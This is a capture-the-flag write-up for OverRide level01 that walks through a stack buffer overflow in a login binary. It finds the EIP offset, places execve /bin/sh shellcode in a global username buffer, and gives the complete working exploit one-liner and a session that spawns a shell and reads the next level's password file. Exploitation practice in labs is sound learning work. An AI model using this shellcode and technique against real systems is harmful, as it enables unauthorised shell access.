# level01

This level is an introduction to the buffer overflow exploits.
Let's use *Cutter* to decompile [level01](./source.c).

Here there isn't an easy solution like a `system(/bin/sh)` lying around.
We will have to do the dirty work ourselves.

If we look around in `main`, we can quickly identify our attack surfaces:

```c
fgets(a_user_name, 0x100, stdin);
fgets(s, 0x64, stdin);
```

`a_user_name` is a global variable with enough space to store user input.
`s` is a local buffer in main — I took the liberty of naming it `s`.

These inputs are used in `verify_user_name` and `verify_user_pass`, respectively, where they are compared to hardcoded values:

```c
// verify_user_name
strncmp(a_user_name, "dat_wil", 7);

// verify_user_pass
strncmp(s, "admin", 5);
```

We can easily bypass these checks and even input additional bytes.
`strncmp` only checks the first 7 characters in `verify_user_name`, and the first 5 in `verify_user_pass`.

Now, let's focus on `s`:
`sizeof(s) == 0x40`, but the second `fgets` allows up to 0x64 bytes to be read into it.
This mean we can perform a BOF (Buffer Overflow)!

Let's find the offset to `EIP` using *pwndbg* and a pattern generator:

```bash
pwndbg level01

pwndbg> r
Starting program: level01
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

Using this address and our pattern generator, we can find the offset is **80 bytes**.

Next, we need a known address with available memory to store our shellcode.
Remember our friend `a_user_name` and 0x100 bytes of space?
Let's find its address using *ltrace*:

```bash
ltrace ./level01
__libc_start_main([ "./level01" ] <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
)                                                                           = 39
printf("Enter Username: ")                                                  = 16
fgets(Enter Username: dat_wil
"dat_wil\n", 256, 0xf7fcfac0)                                               = 0x0804a040
```

Now we have our buffer at `0x0804a040`.
Our shellcode will be stored at `0x0804a047` (`0x0804a040` + 7 bytes for the username).

Let's craft our payload:

- Username: `"dat_wil"`
- Shellcode: `"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"`
- Newline to terminate the first `fgets`: `"\n"`
- 80 bytes of junk to reach `EIP`: `"a" * 80`
- Address of our shellcode: `"\x47\xa0\x04\x08"`

Put together in a python one-liner:
`python -c 'print("dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "a" * 80 + "\x47\xa0\x04\x08")'`

If we combine that with a `cat -` to keep `stdin` open, and pipe it to `level01`, we get:

```bash
(cat <(python -c 'print("dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "a" * 80 + "\x47\xa0\x04\x08")') -) | ./level01
```

Let's try it and grab the flag:

```bash
level01@OverRide:~$ (cat <(python -c 'print("dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "a" * 80 + "\x47\xa0\x04\x08")') -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02

cat /home/users/level02/.pass
<flag>
```
